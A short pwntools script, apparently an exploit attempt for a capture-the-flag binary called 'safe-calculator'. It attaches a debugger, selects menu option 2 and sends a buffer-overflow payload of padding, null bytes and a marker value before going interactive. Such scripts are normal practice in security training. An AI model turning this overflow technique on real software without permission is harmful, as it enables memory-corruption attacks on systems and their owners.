from pwn import *

context.binary = exe = ELF('./safe-calculator')

io = process()
gdb.attach(io, api=True)

io.recvuntil(b'> ')
io.sendline(b'2')
io.recvuntil(b' : ')
io.sendline(b'A'*40 + b'\x00'*8 + b'abcd')
io.interactive()